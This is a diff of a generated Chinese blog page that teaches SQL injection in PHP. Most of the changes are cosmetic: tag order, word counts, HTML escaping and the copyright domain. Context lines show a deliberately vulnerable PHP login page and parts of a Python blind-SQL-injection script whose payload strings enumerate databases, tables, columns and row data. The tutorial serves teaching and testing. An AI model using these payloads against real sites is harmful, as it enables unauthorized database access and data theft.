@@ -855,20 +855,20 @@ SQL注入即是指web应用程序对用户输入数据的合法性没有判断�
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/PHP/" target="_blank">
-                                <span class="chip bg-color">PHP</span>
-                            </a>
-                        
                             <a href="/tags/代码审计/" target="_blank">
                                 <span class="chip bg-color">代码审计</span>
                             </a>
                         
-                            <a href="/tags/渗透测试/" target="_blank">
-                                <span class="chip bg-color">渗透测试</span>
+                            <a href="/tags/PHP/" target="_blank">
+                                <span class="chip bg-color">PHP</span>
                             </a>
                         
                             <a href="/tags/SQL注入/" target="_blank">
                                 <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -905,14 +905,14 @@ SQL注入即是指web应用程序对用户输入数据的合法性没有判断�
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.6k
+                        2.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        11 分
                     </div>
                     
                 
@@ -953,16 +953,16 @@ SQL注入即是指web应用程序对用户输入数据的合法性没有判断�
 <span class="token shell-comment comment"># 循环输出返回值</span>
 <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token string">"ID: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"username: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"password: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"ID: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"username: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"password: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token shell-comment comment"># 关闭连接</span>
 <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token shell-comment comment"># 打印SQL语句</span>
-<span class="token keyword">echo</span> <span class="token string">'&lt;hr&gt;'</span><span class="token punctuation">.</span><span class="token string">'&lt;br&gt;'</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">;</span>
-<span class="token delimiter">?&gt;</span>
-<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124143103763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h3 id="数字型注入与字符型注入的区别"><a href="#数字型注入与字符型注入的区别" class="headerlink" title="数字型注入与字符型注入的区别"></a>数字型注入与字符型注入的区别</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们上面构造的注入页面就是一个数字型的注入页面，变量id拼接在SQL语句中，没有单引号的保护，就容易造成SQL注入。</p>
 <p>payload：</p>
@@ -981,20 +981,20 @@ SQL注入即是指web应用程序对用户输入数据的合法性没有判断�
 <p>所以，字符型注入与数字型注入的<strong>根本区别</strong>在于，<strong>需不需要进行单引号闭合</strong>。</p>
 <h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h4 id="编写登录页面"><a href="#编写登录页面" class="headerlink" title="编写登录页面"></a>编写登录页面</h4><p>这里简单写了一个登陆页面，有POST注入跟万能密码登录</p>
 <p>login.html：</p>
-<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>后台登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-    账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
-    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>后台登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>login.php</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token shell-comment comment"># 判断是否进行了POST传值</span>
@@ -1047,20 +1047,20 @@ SQL注入即是指web应用程序对用户输入数据的合法性没有判断�
 
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
-      <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00"&gt;'</span><span class="token punctuation">;</span>    
+      <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>    
       <span class="token keyword">echo</span> <span class="token string">'You are in...........'</span><span class="token punctuation">;</span>
-      <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">;</span>
+      <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token keyword">else</span> 
     <span class="token punctuation">{</span>
 
-    <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00"&gt;'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>
     <span class="token comment" spellcheck="true">//echo 'You are in...........';</span>
     <span class="token comment" spellcheck="true">//print_r(mysql_error());</span>
     <span class="token comment" spellcheck="true">//echo "You have an error in your SQL syntax";</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;/br&gt;&lt;/font&gt;"</span><span class="token punctuation">;</span>    
-    <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size= 3&gt;'</span><span class="token punctuation">;</span>    
+    <span class="token keyword">echo</span> <span class="token string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>    
+    <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>    
     <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>正确的时候显示的you are in…. 错误的时候就是什么都显示</p>
 <p>猜数据库名第一个字母具体过程，使用二分法</p>
@@ -1091,12 +1091,12 @@ database <span class="token operator">=</span> <span class="token string">"datab
 selectDB <span class="token operator">=</span> <span class="token string">"select database()"</span>
 selectTable <span class="token operator">=</span> <span class="token string">"select table_name from information_schema.tables where table_schema='%s' limit %d,1"</span>
 
-asciiPayload <span class="token operator">=</span> <span class="token string">"' and ascii(substr((%s),%d,1))&gt;=%d #"</span>
-lengthPayload <span class="token operator">=</span> <span class="token string">"' and length(%s)&gt;=%d #"</span>
-selectTableCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #"</span>
+asciiPayload <span class="token operator">=</span> <span class="token string">"' and ascii(substr((%s),%d,1))>=%d #"</span>
+lengthPayload <span class="token operator">=</span> <span class="token string">"' and length(%s)>=%d #"</span>
+selectTableCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"</span>
 
 selectTableNameLengthPayloadfront <span class="token operator">=</span> <span class="token string">"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "</span>
-selectTableNameLengthPayloadbehind <span class="token operator">=</span> <span class="token string">",1)&gt;=%d #"</span>
+selectTableNameLengthPayloadbehind <span class="token operator">=</span> <span class="token string">",1)>=%d #"</span>
 
 
 <span class="token shell-comment comment"># 发送请求，根据页面的返回的判断长度的猜测结果</span>
@@ -1149,14 +1149,14 @@ def <span class="token function">inject</span><span class="token punctuation">(<
         tableName <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span>asciiPayload<span class="token punctuation">,</span> selectTableName<span class="token punctuation">,</span> tableNameLength<span class="token punctuation">)</span>
         <span class="token keyword">print</span> <span class="token punctuation">(</span>tableName<span class="token punctuation">)</span>
 
-    selectColumnCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s')&gt;=%d #"</span>
+    selectColumnCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s')>=%d #"</span>
     <span class="token shell-comment comment"># print selectColumnCountPayload</span>
     <span class="token shell-comment comment"># 获取指定表的列的数量</span>
     columnCount <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectColumnCountPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>
     <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"table:"</span> <span class="token operator">+</span> getTable <span class="token operator">+</span> <span class="token string">" --count of column:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>columnCount<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
     <span class="token shell-comment comment"># 获取该表有多少行数据</span>
-    dataCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(*) from %s)&gt;=%d #"</span>
+    dataCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(*) from %s)>=%d #"</span>
     dataCount <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>dataCountPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>
     <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"table:"</span> <span class="token operator">+</span> getTable <span class="token operator">+</span> <span class="token string">" --count of data: "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>dataCount<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
@@ -1165,7 +1165,7 @@ def <span class="token function">inject</span><span class="token punctuation">(<
     <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> columnCount<span class="token punctuation">)</span><span class="token punctuation">:</span>
         <span class="token shell-comment comment"># 获取该列名字长度</span>
         selectColumnNameLengthPayload <span class="token operator">=</span> <span class="token string">"'and (select length(column_name) from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s' limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>
-            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)&gt;=%d #"</span>
+            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)>=%d #"</span>
         <span class="token shell-comment comment"># print selectColumnNameLengthPayload</span>
         columnNameLength <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectColumnNameLengthPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>
         <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"current column length:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>columnNameLength<span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -1180,7 +1180,7 @@ def <span class="token function">inject</span><span class="token punctuation">(<
         tmpData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span>
         <span class="token shell-comment comment"># 获取该表的数据</span>
         <span class="token keyword">for</span> j in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> dataCount<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            columnDataLengthPayload <span class="token operator">=</span> <span class="token string">"'and (select length("</span> <span class="token operator">+</span> columnName <span class="token operator">+</span> <span class="token string">") from %s limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)&gt;=%d #"</span>
+            columnDataLengthPayload <span class="token operator">=</span> <span class="token string">"'and (select length("</span> <span class="token operator">+</span> columnName <span class="token operator">+</span> <span class="token string">") from %s limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)>=%d #"</span>
             <span class="token shell-comment comment"># print columnDataLengthPayload</span>
             columnDataLength <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>columnDataLengthPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>
             <span class="token shell-comment comment"># print columnDataLength</span>
@@ -1851,20 +1851,20 @@ def <span class="token function">main</span><span class="token punctuation">(</s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
                     <a href="/tags/代码审计/" target="_blank">
                         <span class="chip bg-color">代码审计</span>
                     </a>
                     
-                    <a href="/tags/伪协议/" target="_blank">
-                        <span class="chip bg-color">伪协议</span>
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                     <a href="/tags/渗透测试/" target="_blank">
                         <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/伪协议/" target="_blank">
+                        <span class="chip bg-color">伪协议</span>
                     </a>
                     
                 </div>
@@ -2098,7 +2098,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
     <div class="container row center-align">
         <div class="col s12 m8 l8 copy-right">
             
-            Copyright&copy; 2019 luckyzmj.cn
+            Copyright&copy; 2021 biadu.cn
             <!-- 备案信息配置
             Copyright&copy; 2019 luckyzmj.cn | <a href="http://www.beian.miit.gov.cn/">备案</a>
             <br>
@@ -2127,7 +2127,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">101.1k</span> 字
+                <span class="white-color">99.4k</span> 字
             
 
             
@@ -2331,8 +2331,8 @@ $(function () {
       app_id: "XXXXX"
     });
   daovoice('update');
-  </script>
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
 </html>
